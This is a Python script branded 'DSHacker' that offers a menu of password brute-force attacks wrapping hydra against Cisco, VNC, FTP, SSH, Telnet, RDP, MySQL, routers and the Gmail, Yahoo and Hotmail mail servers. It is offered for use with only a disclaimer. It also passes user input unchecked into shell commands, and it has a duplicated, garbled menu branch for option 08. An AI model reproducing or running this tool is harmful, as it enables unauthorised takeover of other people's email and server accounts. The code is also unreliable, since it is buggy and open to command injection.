import os
import sys
import time
name = input("Enter Your Name: ")
# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################
os.system(" clear")
print("This scripts is written by DSHacker")
print("Am not responsible for any illega use of this tool")
print("Hello " + name + "! You are welcome to DSHacker community")

print ("              ===|[ Brute Force ]|=== ")
print 
print ("  [01] Cisco Brute Force         ")
print ("  [02] VNC Brute Force           ")
print ("  [03] FTP Brute Force           ")
print ("  [04] Gmail Brute Force         ")
print ("  [05] SSH Brute Force           ")
print ("  [06] TeamSpeak Brute Force     ")
print ("  [07] Telnet Brute Force        ")
print ("  [08] Yahoo Mail Brute Force    ")
print ("  [09] Hotmail Brute Force       ")
print ("  [10] Router Speedy Brute Force ")
print ("  [11] RDP Brute Force           ")
print ("  [12] MySQL Brute Force         ")
print
print (" [00] Exit")
print
dshbrute = input("[*] DSHbrute > ")

if dshbrute == '01' or dshbrute == '1':
  print
  print ("          +---------------------------+")
  print ("          |     Cisco Brute Force     |")
  print ("          +---------------------------+")
  print
  print
  print
  iphost = input("[*] IP/Hostname : ")
  word = input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()

elif dshbrute == '02' or dshbrute == '2':
  print
  print ("          +---------------------------+")
  print ("          |      VNC Brute Force      |")
  print ("          +---------------------------+")
  print
  print
  word = input("[*] Wordlist : ")
  iphost = input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = input("[*] IP/Hostname : ")

elif dshbrute == '03' or dshbrute == '3':
  print
  print ("          +------------------------------+")
  print ("          |        FTP Brute Force       |")
  print ("          +------------------------------+")
  print
  user = input("[*] User : ")
  iphost = input("[*] IP/Hostname : ")
  word = input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()

elif dshbrute == '04' or dshbrute == '4':
  print
  print ("          +------------------------------+")
  print ("          |       Gmail Brute Force      |")
  print ("          +------------------------------+")
  print
  print
  email = input("[*] Email : ")
  word = input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()

elif dshbrute == '05' or dshbrute == '5':
   print
   print ("         +--------------------------------+")
   print ("         |        SSH Brute Force         |")
   print ("         +--------------------------------+")
   print
   print
   user = input("[*] User : ")
   word = input("[*] Wordlist : ")
   iphost = input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()

elif dshbrute == '06' or dshbrute == '6':
        print
        print ("        +-------------------------+")
        print ("      DSHbrute  |  TeamSpeak Brute Force  |")
        print ("        +-------------------------+")
        print
        print
        user = input("[*] User : ")
        word = input("[*] Wordlist : ")
        iphost = input("[*] IP/Hostname : ")
        os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        sys.exit()

elif dshbrute == '07' or dshbrute == '7':
        print
        print ("        +-------------------------+")
        print ("        |   Telnet Brute Force    |")
        print ("        +-------------------------+")
        print
        print
        user = input("[*] User : ")
        word = input("[*] Wordlist : ")
        iphost = input("[*] IP/Hostname : ")
        os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
        sys.exit()

elif dshbrute == '08' or dshbrute == '8':
  print
  print ("          +---------------------------+")
  print ("        +-------------------------+")
  print
  user = input("[*] User : ")
  word = input("[*] Wordlist : ")
  iphost = input("[*] IP/Hostname : ")
  os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
  sys.exit()

elif dshbrute == '08' or dshbrute == '8':
  print
  print ("          +---------------------------+")
  print ("          |     Yahoo Brute Force     |")
  print ("          +---------------------------+")
  print
  print
  email = input("[*] Email : ")
  word = input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()

elif dshbrute == '09' or dshbrute == '9':
  print
  print ("          +----------------------------+")
  print ("          |    Hotmail Brute Force     |")
  print ("          +----------------------------+")
  print
  print
  email = input("[*] Email : ")
  word = input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()

elif dshbrute == '10':
        print
        print ("        +-----------------------------+")
        print ("        |  Router Speedy Brute Force  |")
        print ("        +-----------------------------+")
        print
        print
        print
        user = input("[*] User : ")
        word = input("[*] Wordlist : ")
        iphost = input("[*] IP/Hostname : ")
        os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        sys.exit()

elif dshbrute == '11':
        print
        print ("        +----------------------------+")
        print ("        |      RDP Brute Force       |")
        print ("        +----------------------------+")
        print
        print
        user = input("[*] User : ")
        word = input("[*] Wordlist : ")
        iphost = input("[*] IP/Hostname : ")
        os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        sys.exit()

elif dshbrute == '12':
        print
        print ("        +-----------------------------+")
        print ("        |       MySQL Brute Force     |")
        print ("        +-----------------------------+")
        print
        print
        user = input("[*] User : ")
        word = input("[*] Wordlist : ")
        os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))

elif dshbrute == '00' or dshbrute == '0':
        print ("\n[!] Exit the Program...")
        sys.exit()

else:
        print ("\n[!] ERROR : Wrong Input")
        time.sleep(1)
        restart_program()